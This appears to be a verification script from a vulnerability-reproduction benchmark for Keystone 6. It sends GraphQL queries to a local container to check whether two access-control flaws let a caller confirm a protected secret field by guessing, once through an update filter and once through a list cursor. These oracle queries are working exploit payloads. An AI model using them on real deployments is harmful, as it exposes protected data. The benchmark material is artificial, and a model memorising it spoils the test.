#!/usr/bin/env bash
# PCBV2-0061 keystone6 (CVE-2025-46720 seed / CVE-2026-33326 residual) -- 定制 verify.sh
#
# 机制: REAL @keystone-6/core GraphQL 服务 (/api/graphql)。entrypoint 用容器 env PCB_FLAG
#       (start.sh 注入 RUN_FLAG=真 flag) 播种一条 Secret(code=真 flag) + 若干 decoy。
#       受保护字段 Secret.code (isFilterable:()=>false, access.read denyAll) 无法直接读取,
#       但可被布尔 value-oracle 确认:
#   seed    : updateSecret(where:{id, code:<guess>})  -- CVE-2025-46720
#               v0(6.4.0, 只检查第一个 key) -> 猜中则 where 匹配并返回 id  rc=0
#               v1(6.5.1, where 全字段 access 检查) -> KS_FILTER_DENIED     rc=10
#   residual: secrets(cursor:{code:<guess>}, take:1) -- CVE-2026-33326
#               v1(6.5.1, cursor 未检查) -> 猜中则返回行                    rc=0
#               v2(6.5.2, cursor 检查) -> KS_FILTER_DENIED                  rc=10
# flag 通道: 容器内 PCB_FLAG=真 flag; guess 用提交值 RUN_FLAG (正常 seed 时=真 flag -> oracle 确认 -> 0;
#           wrong/stale 检查时 RUN_FLAG=override != 容器真 flag -> oracle 不确认 -> 10)。
# 退出码: 0=效果发生 10=未发生 20=环境失败 30=参数错误
set -uo pipefail

: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }

CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

# 动态解析 host 端口 (compose 固定映射或平台动态端口都适用)
HOSTPORT="$(CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-3000}"
docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$VERSION" "$CPORT" 2>/dev/null | head -n1)"
PORT="${HOSTPORT##*:}"
[[ -n "${PORT:-}" ]] || { echo "port resolve failed for $VERSION" >&2; exit 20; }

"$PY" - "$PORT" "$RUN_FLAG" "$MODE" <<'PYEOF'
import json, sys, time, urllib.error, urllib.request

port, run_flag, mode = sys.argv[1], sys.argv[2], sys.argv[3]


def gql(query):
    url = "http://127.0.0.1:%s/api/graphql" % port
    req = urllib.request.Request(
        url, data=json.dumps({"query": query}).encode(),
        headers={"content-type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return json.loads(r.read().decode())
    except urllib.error.HTTPError as e:
        try:
            return json.loads(e.read().decode())
        except Exception:
            return {"errors": [{"message": "HTTP %s" % e.code}]}
    except Exception as e:
        raise RuntimeError("gql-conn: %r" % (e,))


def denied(resp):
    for e in (resp.get("errors") or []):
        ext = e.get("extensions") or {}
        if ext.get("code") == "KS_FILTER_DENIED":
            return True
        if "filter' operations" in (e.get("message") or ""):
            return True
    return False


def all_ids():
    resp = gql("{ secrets{ id } }")
    if denied(resp):
        return None
    return [r["id"] for r in ((resp.get("data") or {}).get("secrets") or [])]


if mode == "--seed":
    # 等待 GraphQL 就绪 + entrypoint 播种完成 (平台 readiness 之后兜底轮询)
    ids = []
    for _ in range(20):
        try:
            ids = all_ids() or []
        except RuntimeError:
            ids = []
        if ids:
            break
        time.sleep(3)
    if not ids:
        print("no secrets reachable (env not ready)")
        sys.exit(20)
    hit = False
    for rid in ids:
        q = ('mutation{ updateSecret(where:{id:"%s", code:"%s"}, '
             'data:{label:"seed"}){ id } }' % (rid, run_flag))
        r = gql(q)
        if denied(r):
            print("filter denied (blocked)")
            sys.exit(10)
        if ((r.get("data") or {}).get("updateSecret") or {}).get("id") == rid:
            hit = True
            print("update oracle matched id:", rid)
            break
    sys.exit(0 if hit else 10)
else:
    q = ('{ secrets(cursor:{code:"%s"}, take:1, orderBy:{id:asc}){ id } }' % run_flag)
    r = gql(q)
    if denied(r):
        print("filter denied (blocked)")
        sys.exit(10)
    n = len((r.get("data") or {}).get("secrets") or [])
    print("cursor oracle matched rows:", n)
    sys.exit(0 if n > 0 else 10)
PYEOF
exit $?
